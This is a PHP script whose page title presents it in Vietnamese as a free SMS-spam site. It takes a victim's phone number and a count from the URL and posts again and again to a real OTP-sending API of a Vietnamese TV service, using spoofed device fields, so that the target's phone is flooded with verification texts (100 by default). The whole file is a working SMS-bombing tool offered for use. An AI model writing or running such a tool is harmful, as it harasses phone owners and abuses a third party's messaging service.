<?php 
echo'
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpamMessage.Ga Trang Spam Tin Nhắn Miễn Phí</title>';
$phone=$_GET[ "phone"]; 
$amount=$_GET[ "amount"];
$header = array(
    "Connection: close",
    "Content-Type: application/x-www-form-urlencoded",
    "User-Agent: okhttp/4.0.1"
    );
$data = "ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone;
$login = "https://apib2cm.mytvnet.vn/v8/vnptid/send-otp";
if(isset($_GET[ "phone"])){ 
echo "Send Messages To Phone: ".$phone."<br/>";
    if($amount=="" ){
        for($i=1; $i<=100; $i++){ 
          $opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => $data
    )
);
$context = stream_context_create($opts);
$result = file_get_contents($login, false, $context);
            echo "Done (".$i.")";
            echo "\r                   \r"; 
            
        }
        
    }else{ 
        for($i=1; $i<=(int)$amount; $i++){ 
            $opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => $data
    )
);
$context = stream_context_create($opts);
$result = file_get_contents($login, false, $context);
        echo "Done (".$i.")"; 
        echo "\r                   \r"; 
            
        } 
        } 
    
}else{ 
            echo "Không tìm thấy số điện thoại(phone error)"; 
            } 

?>
